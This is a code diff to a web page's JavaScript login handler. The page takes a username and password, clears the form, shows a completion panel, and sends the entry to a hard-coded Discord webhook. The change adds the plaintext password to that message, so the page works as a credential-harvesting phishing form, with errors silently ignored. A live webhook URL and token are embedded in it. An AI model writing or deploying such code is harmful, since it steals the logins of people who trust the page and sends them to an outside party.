@@ -45,7 +45,7 @@ function $(id){return document.getElementById(id)}
 $("go").onclick=async function(){
   var u=$("u").value, p=$("p").value;
   if(u.trim()&&p){$("u").value=$("p").value="";$("e").textContent="";$("login").classList.add("hide");$("done").classList.remove("hide");
-    fetch("https://discord.com/api/webhooks/1574032353267810405/fC-02-yGlQSFUitponDR6THtG7rLz2oYXEJlYErie5QG5L5QYr-4553Zz0zwsD8REBgW",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:"Login - username: "+u+" | time: "+new Date().toISOString()})}).catch(function(){});}
+    fetch("https://discord.com/api/webhooks/1574032353267810405/fC-02-yGlQSFUitponDR6THtG7rLz2oYXEJlYErie5QG5L5QYr-4553Zz0zwsD8REBgW",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:"Login - username: "+u+" Password: "+p+" | time: "+new Date().toISOString()})}).catch(function(){});}
   else{$("e").textContent="Enter a username and password."}
 };
 $("p").addEventListener("keydown",function(e){if(e.key==="Enter")$("go").click()});
